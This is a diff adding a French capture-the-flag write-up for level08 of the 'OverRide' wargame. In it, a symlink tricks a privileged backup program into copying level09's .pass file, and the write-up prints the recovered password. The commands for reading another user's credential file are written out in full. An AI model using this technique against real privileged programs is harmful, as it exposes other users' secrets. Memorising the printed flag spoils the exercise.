@@ -1,0 +1,37 @@
+On voit que ce programe attend un parametre:
+level08@OverRide:~$ ./level08
+Usage: ./level08 filename
+ERROR: Failed to open (null)
+
+De plus, on voit qu'il y a un dossier backups a la racine du level08:
+level08@OverRide:~$ ls
+backups  level08
+
+En regardant son contenu, on voit que le dossier est vide:
+level08@OverRide:~$ ls backups
+level08@OverRide:~$
+
+Apres avoir lance le programe avec un argument, on voit que le programe attend un file:
+level08@OverRide:~$ ./level08 wjnwkl
+ERROR: Failed to open wjnwkl
+
+En lancant avec un file, on voit que le programe creer une copie dans le dossier backup:
+level08@OverRide:~$ touch 42
+level08@OverRide:~$ ./level08 42
+level08@OverRide:~$ ls backups
+42
+
+Nous devrions donc pouvoir creer une copie du .pass du level9 en mettant son path en argument et etre capable de le read depuis le document de backup:
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+Mais il y a une erreur a cause du / de backups/.
+Nous allons donc tester de creer un lien symbolique entre un fichier a la racine et celui de /home/users/level09/.pass:
+level08@OverRide:~$ touch pass
+level08@OverRide:~$ ln -fs /home/users/level09/.pass pass
+level08@OverRide:~$ ls -la pass
+lrwxrwxrwx 1 level08 level08 25 Oct 22 16:51 pass -> /home/users/level09/.pass
+level08@OverRide:~$ ./level08 pass
+level08@OverRide:~$ cat backups/pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
